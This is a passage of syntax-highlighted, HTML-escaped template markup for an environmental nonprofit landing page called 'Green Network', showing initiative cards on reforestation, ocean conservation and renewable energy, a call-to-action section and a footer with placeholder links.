&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                &amp;lt;div class=&amp;#34;stat-item&amp;#34;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                    &amp;lt;h3 class=&amp;#34;counter&amp;#34; data-target=&amp;#34;120&amp;#34;&amp;gt;0&amp;lt;/h3&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                    &amp;lt;p&amp;gt;Countries Reached&amp;lt;/p&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                &amp;lt;div class=&amp;#34;stat-item&amp;#34;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                    &amp;lt;h3 class=&amp;#34;counter&amp;#34; data-target=&amp;#34;1500&amp;#34;&amp;gt;0&amp;lt;/h3&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                    &amp;lt;p&amp;gt;Cleanup Projects&amp;lt;/p&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;            &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;        &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;    &amp;lt;/section&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;    &amp;lt;!-- Initiatives Section --&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;    &amp;lt;section class=&amp;#34;initiatives&amp;#34; id=&amp;#34;initiatives&amp;#34;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;        &amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;            &amp;lt;div class=&amp;#34;section-title&amp;#34;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                &amp;lt;h2&amp;gt;Our Initiatives&amp;lt;/h2&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                &amp;lt;p&amp;gt;Discover the key programs and projects we&amp;#39;&lt;/span&gt;re implementing to protect our planet.&amp;lt;/p&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;initiatives-grid&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;initiative-card&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;initiative-img&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &amp;lt;img &lt;span class=&#34;nv&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;https://dialogue.earth/content/uploads/2021/04/lessons-from-the-rush-to-reforest-china-dialogue-2400x1599.jpg&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;alt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Reforestation&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;initiative-content&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &amp;lt;h3&amp;gt;Global Reforestation&amp;lt;/h3&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &amp;lt;p&amp;gt;Planting millions of trees worldwide to restore ecosystems, combat climate change, and protect biodiversity.&amp;lt;/p&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &amp;lt;a &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;btn&amp;#34;&lt;/span&gt;&amp;gt;Learn More&amp;lt;/a&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;initiative-card&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;initiative-img&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &amp;lt;img &lt;span class=&#34;nv&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;https://images.unsplash.com/photo-1621451537084-482c73073a0f?ixlib=rb-4.0.3&amp;amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&amp;amp;auto=format&amp;amp;fit=crop&amp;amp;w=1974&amp;amp;q=80&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;alt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Ocean Conservation&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;initiative-content&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &amp;lt;h3&amp;gt;Ocean Conservation&amp;lt;/h3&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &amp;lt;p&amp;gt;Protecting marine ecosystems, reducing plastic pollution, and promoting sustainable fishing practices.&amp;lt;/p&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &amp;lt;a &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;btn&amp;#34;&lt;/span&gt;&amp;gt;Learn More&amp;lt;/a&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;initiative-card&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;initiative-img&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &amp;lt;img &lt;span class=&#34;nv&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;https://images.unsplash.com/photo-1508514177221-188b1cf16e9d?ixlib=rb-4.0.3&amp;amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&amp;amp;auto=format&amp;amp;fit=crop&amp;amp;w=2072&amp;amp;q=80&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;alt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Renewable Energy&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;initiative-content&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &amp;lt;h3&amp;gt;Renewable Energy&amp;lt;/h3&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &amp;lt;p&amp;gt;Promoting solar, wind, and other clean energy sources to reduce dependence on fossil fuels.&amp;lt;/p&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &amp;lt;a &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;btn&amp;#34;&lt;/span&gt;&amp;gt;Learn More&amp;lt;/a&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;/section&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;!-- CTA Section --&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;section &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;cta&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;get-involved&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;container&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &amp;lt;h2&amp;gt;Join Our Global Movement&amp;lt;/h2&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &amp;lt;p&amp;gt;Together, we can create a sustainable future &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; generations to come. Every action counts, no matter how small.&amp;lt;/p&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &amp;lt;a &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;btn&amp;#34;&lt;/span&gt;&amp;gt;Become a Member&amp;lt;/a&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;/section&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;!-- Footer --&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;footer &lt;span class=&#34;nv&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;contact&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;container&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;footer-content&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;footer-column&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;h3&amp;gt;Green Network&amp;lt;/h3&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;p&amp;gt;We are dedicated to protecting our planet through collaborative action, education, and sustainable solutions.&amp;lt;/p&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;social-links&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &amp;lt;a &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#&amp;#34;&lt;/span&gt;&amp;gt;Facebook&amp;lt;/a&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &amp;lt;a &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#&amp;#34;&lt;/span&gt;&amp;gt;Twitter&amp;lt;/a&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &amp;lt;a &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#&amp;#34;&lt;/span&gt;&amp;gt;Instagram&amp;lt;/a&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &amp;lt;a &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#&amp;#34;&lt;/span&gt;&amp;gt;LinkedIn&amp;lt;/a&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;footer-column&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;h3&amp;gt;Quick Links&amp;lt;/h3&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;ul &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;footer-links&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &amp;lt;li&amp;gt;&amp;lt;a &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#home&amp;#34;&lt;/span&gt;&amp;gt;Home&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &amp;lt;li&amp;gt;&amp;lt;a &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#about&amp;#34;&lt;/span&gt;&amp;gt;About Us&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &amp;lt;li&amp;gt;&amp;lt;a &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#initiatives&amp;#34;&lt;/span&gt;&amp;gt;Initiatives&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &amp;lt;li&amp;gt;&amp;lt;a &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#get-involved&amp;#34;&lt;/span&gt;&amp;gt;Get Involved&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &amp;lt;li&amp;gt;&amp;lt;a &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#contact&amp;#34;&lt;/span&gt;&amp;gt;Contact&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;/ul&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;footer-column&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;h3&amp;gt;Our Programs&amp;lt;/h3&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;lt;ul &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;footer-links&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &amp;lt;li&amp;gt;&amp;lt;a &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#&amp;#34;&lt;/span&gt;&amp;gt;Reforestation&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &amp;lt;li&amp;gt;&amp;lt;a &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#&amp;#34;&lt;/span&gt;&amp;gt;Ocean Cleanup&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
